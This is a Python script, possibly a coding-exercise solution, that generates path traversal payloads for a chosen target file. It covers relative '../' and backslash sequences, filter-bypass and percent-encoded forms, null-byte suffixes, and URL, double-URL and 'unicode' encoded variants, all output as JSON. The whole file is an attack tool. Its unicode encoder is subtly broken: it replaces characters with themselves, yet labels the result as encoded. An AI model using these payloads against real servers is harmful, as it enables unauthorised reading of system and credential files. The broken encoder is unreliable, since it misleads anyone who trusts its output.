import json
import urllib.parse

def generate_basic_payloads(target_file):
    """Generate basic path traversal payloads"""
    payloads = []
    
    # Basic directory traversal patterns
    patterns = [
        "../",
        "../../",
        "../../../",
        "../../../../",
        "../../../../../",
        "../../../../../../",
        "../../../../../../../",
        "../../../../../../../../",
        "./",
        ".//",
        "..\\",
        "..\\..\\",
        "..\\..\\..\\",
        "....//",
        "....//....//",
        "..%2f",
        "..%2f..%2f",
        "..%5c",
        "..%5c..%5c"
    ]
    
    for pattern in patterns:
        payload = pattern + target_file.lstrip('/')
        payloads.append(payload)
    
    # Absolute path variations
    payloads.append(target_file)
    
    # Null byte variations
    payloads.append(target_file + "%00")
    payloads.append(target_file + "%00.jpg")
    
    return payloads

def url_encode(payload):
    """URL encode the payload"""
    return urllib.parse.quote(payload, safe='')

def double_url_encode(payload):
    """Double URL encode the payload"""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

def unicode_encode(payload):
    """Unicode encode specific characters in the payload"""
    # Replace common path traversal characters with unicode equivalents
    result = payload
    result = result.replace('/', '\u002f')
    result = result.replace('\\', '\u005c')
    result = result.replace('.', '\u002e')
    return result

def generate_payloads(target_file, encoding):
    """Generate payloads based on target file and encoding"""
    basic_payloads = generate_basic_payloads(target_file)
    result = []
    
    if encoding == "none" or encoding == "all":
        for payload in basic_payloads:
            result.append({
                "payload": payload,
                "encoding": "none",
                "description": f"Basic path traversal targeting {target_file}"
            })
    
    if encoding == "url" or encoding == "all":
        for payload in basic_payloads:
            encoded_payload = url_encode(payload)
            result.append({
                "payload": encoded_payload,
                "encoding": "url",
                "description": f"URL encoded path traversal targeting {target_file}"
            })
    
    if encoding == "double_url" or encoding == "all":
        for payload in basic_payloads:
            encoded_payload = double_url_encode(payload)
            result.append({
                "payload": encoded_payload,
                "encoding": "double_url",
                "description": f"Double URL encoded path traversal targeting {target_file}"
            })
    
    if encoding == "unicode" or encoding == "all":
        for payload in basic_payloads:
            encoded_payload = unicode_encode(payload)
            result.append({
                "payload": encoded_payload,
                "encoding": "unicode",
                "description": f"Unicode encoded path traversal targeting {target_file}"
            })
    
    return result

def main():
    # Read input from stdin
    target_file = input().strip()
    encoding = input().strip()
    
    # Generate payloads
    payloads = generate_payloads(target_file, encoding)
    
    # Output as JSON
    print(json.dumps(payloads, indent=2))

if __name__ == "__main__":
    main()